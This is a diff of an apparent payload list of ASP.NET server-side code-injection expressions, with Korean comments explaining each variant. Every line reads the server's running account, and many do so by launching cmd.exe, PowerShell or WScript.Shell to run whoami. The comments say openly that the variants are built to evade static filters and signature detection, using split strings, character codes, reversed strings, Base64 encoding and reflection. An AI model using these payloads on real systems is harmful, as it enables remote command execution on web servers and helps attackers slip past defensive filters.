@@ -1,30 +1,20 @@
 <%= System.Security.Principal.WindowsIdentity.GetCurrent().Name %>
-' .NET API를 사용해 외부 프로세스 생성 없이 현재 실행 계정명 직접 조회
-<%= System.Environment.UserDomainName + "" + System.Environment.UserName %>
-' Environment 환경 변수 값을 조합하여 도메인 및 사용자 이름 직접 조회
-<%= System.Security.Principal.WindowsPrincipal.Current.Identity.Name %>
-' 현재 스레드의 WindowsPrincipal 보안 주체로부터 계정 식별자 조회
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(@"C:\Windows\System32\whoami.exe") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' cmd.exe를 거치지 않고 whoami.exe 바이너리를 직접 호출해 실행
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("c" + "m" + "d" + "." + "e" + "x" + "e", "/c " + "w" + "h" + "o" + "a" + "m" + "i") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' cmd.exe 및 /c whoami 문자열을 잘라 결합하여 정적 필터링 우회
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(((char)99).ToString()+((char)109)+((char)100)+".exe", "/c "+((char)119)+((char)104)+((char)111)+((char)97)+((char)109)+((char)105)) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' ASCII 코드값(char)으로 명령어를 변환·결합하여 텍스트 기반 시그니처 감지 우회
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(new string(new char[]{'c','m','d','.','e','x','e'}), "/c " + new string(new char[]{'w','h','o','a','m','i'})) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' char 배열(Array) 형태로 인자값을 넘겨 인스턴스를 생성하는 우회
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(new string("exe.dmc".ToCharArray().Reverse().ToArray()), "/c " + new string("imaohw".ToCharArray().Reverse().ToArray())) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 문자열을 역순으로 배치한 뒤 동적으로 반전(Reverse)시켜 실행
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(@"C:\Windows\SysWOW64\cmd.exe", "/c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 32비트 하위 호환용 SysWOW64 경로의 cmd.exe를 호출하여 실행
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"."+"e"+"x"+"e", "-c " + "w" + "h" + "o" + "a" + "m" + "i") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' PowerShell 실행 파일명을 결합 문자로 분할하여 호출
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("conhost.exe", "cmd.exe /c whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' Windows 콘솔 호스트(conhost.exe) 하위로 명령어를 경유하여 실행
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y21kLmV4ZQ==")), System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("L2Mgd2hvYW1p"))) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' 실행 대상 파일과 인자 전체를 Base64로 인코딩하여 동적 디코딩 실행
-<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-e d2hvYW1p") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
-' PowerShell의 -EncodedCommand(-e) 옵션으로 Base64 명령어 수행
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c whoami > " + Server.MapPath("w.txt")) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("w.txt")) %>
-' 실행 결과를 웹 디렉터리 텍스트 파일로 리다이렉션 후 ReadAllText로 확인
-<%= System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\Windows\Temp\w.txt") == null ? "" : System.IO.File.ReadAllText("C:\Windows\Temp\w.txt") %>
-' 실행 결과를 시스템 Temp 디렉터리 텍스트 파일로 리다이렉션 후 확인
+' .NET API를 사용해 프로세스 생성 없이 현재 실행 계정명 직접 조회
+​<%= System.Environment.UserDomainName + "" + System.Environment.UserName %>
+' Environment 환경 변수 값에서 도메인 및 사용자 이름 직접 추출
+​<%= System.Security.Principal.WindowsPrincipal.Current.Identity.Name %>
+' WindowsPrincipal 보안 주체 객체에서 현재 식별자 계정명 조회
+​<%= System.Threading.Thread.CurrentPrincipal.Identity.Name %>
+' 현재 스레드의 보안 컨텍스트에 할당된 계정명 조회
+​<%= System.IO.Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)).FullName %>
+' 사용자 프로필 폴더 경로를 조회하여 계정 디렉터리 확인
+​<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("WSc"+"ript.Ne"+"twork"))).UserName %>
+' WScript.Network COM 객체를 리플렉션으로 동적 생성하여 계정명 조회
+​<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("WSc"+"ript.Ne"+"twork"))).UserDomain %>
+' WScript.Network COM 객체를 동적 생성하여 도메인 이름 조회
+​<%= new System.Management.ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem").Get().GetEnumerator().MoveNext() ? new System.Management.ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem").Get().GetEnumerator().Current["UserName"].ToString() : "" %>
+' WMI(Win32_ComputerSystem) 쿼리를 수행하여 로그인/실행 계정 조회
+​<%= ((System.Reflection.MethodInfo)Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetMethod("St"+"art", new Type[]{typeof(string), typeof(string)})).Invoke(null, new object[]{"cmd.exe", "/c whoami > " + Server.MapPath("w.txt")}) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("w.txt")) %>
+' Process 타입을 리플렉션으로 문자열 동적 로드하여 실행 후 파일로 결과 확인
+​<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("WSc"+"ript.Sh"+"ell"))).Exec("cm"+"d.e"+"xe /c whoami").StdOut.ReadAll() %>
+' WScript.Shell COM 객체를 동적 인스턴스화하여 whoami 실행 후 결과 출력
